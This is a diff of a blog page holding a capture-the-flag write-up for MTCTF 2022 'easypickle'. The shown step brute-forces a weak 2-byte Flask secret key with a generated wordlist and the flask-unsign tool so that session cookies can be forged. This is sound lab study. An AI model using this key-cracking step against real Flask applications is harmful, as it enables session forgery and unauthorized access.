@@ -20,7 +20,7 @@
 <meta property="og:image" content="https://21346asz.github.io/uncategorized/MTCTF-2022-easypickle/image-20250704112228473.png">
 <meta property="og:image" content="https://21346asz.github.io/uncategorized/MTCTF-2022-easypickle/image-20250704112249719.png">
 <meta property="article:published_time" content="2025-07-04T01:33:28.000Z">
-<meta property="article:modified_time" content="2025-07-04T03:23:04.780Z">
+<meta property="article:modified_time" content="2025-07-04T03:25:57.460Z">
 <meta property="article:author" content="wArn">
 <meta property="article:tag" content="pickle">
 <meta name="twitter:card" content="summary">
@@ -176,7 +176,7 @@
 <p>从代码分析：注入点在session里面，所以我们第一步，要能伪造session，先拿key密钥。</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>] = os.urandom(<span class="number">2</span>).<span class="built_in">hex</span>()</span><br></pre></td></tr></table></figure>
 
-<p>2位，可以思考一下爆破。</p>
+<p>2位，可以考虑一下爆破。</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;./key.txt&#x27;</span>,<span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1000000</span>):</span><br><span class="line">        data = os.urandom(<span class="number">2</span>).<span class="built_in">hex</span>()</span><br><span class="line">        f.write(<span class="string">f&quot;\&quot;<span class="subst">&#123;data&#125;</span>\&quot;&quot;</span>+<span class="string">&quot;\n&quot;</span>) <span class="comment">#必须要用&quot;&quot;包裹住数据。 </span></span><br></pre></td></tr></table></figure>
 
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flask-unsign --unsign --cookie <span class="string">&quot;eyJ1c2VyIjoiaW5hbmEifQ.aGcv6w.ES6J2y5h1GTL9DfjyM-kpgpsoLQ&quot;</span> --wordlist key.txt</span><br></pre></td></tr></table></figure>
